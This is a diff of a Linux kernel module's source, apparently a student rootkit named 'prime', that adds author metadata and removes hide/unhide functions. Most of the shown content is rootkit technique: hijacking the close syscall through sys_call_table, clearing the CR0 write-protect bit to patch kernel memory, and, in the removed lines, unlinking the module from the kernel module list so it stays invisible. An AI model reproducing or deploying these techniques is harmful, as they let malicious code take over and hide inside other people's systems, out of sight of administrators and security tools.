@@ -1,16 +1,17 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/unistd.h>
+#include "more_stuff.h"
 
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Nathan Castets & Olivier Huge");
+MODULE_DESCRIPTION("Fallen Dragon, Peter F. Hamilton");
 
 #define SEARCH_RANGE 512
 #define PATTERN_SIZE 7
 
 static void **sys_call_table;
 static void **ia32_sys_call_table;
-
-static struct list_head *module_list;
 
 asmlinkage long (*real_close)(struct pt_regs *);
 
@@ -102,26 +103,6 @@ static void unhook_syscall(void) {
   sys_call_table[__NR_close] = real_close;
   write_cr0(read_cr0() | 0x10000);
 }
-
-void hide(void) {
-  if (module_list) {
-    printk(KERN_INFO "prime is already hidden");
-    return;
-  }
-
-  module_list = THIS_MODULE->list.prev;
-  list_del(&THIS_MODULE->list);
-}
-
-void unhide(void) {
-  if (!module_list) {
-    printk(KERN_INFO "prime is already unhidden");
-    return;
-  }
-
-  list_add(&THIS_MODULE->list, module_list);
-  module_list = NULL;
-} 
 
 int init_module(void) {
   printk(KERN_INFO "prime module started");
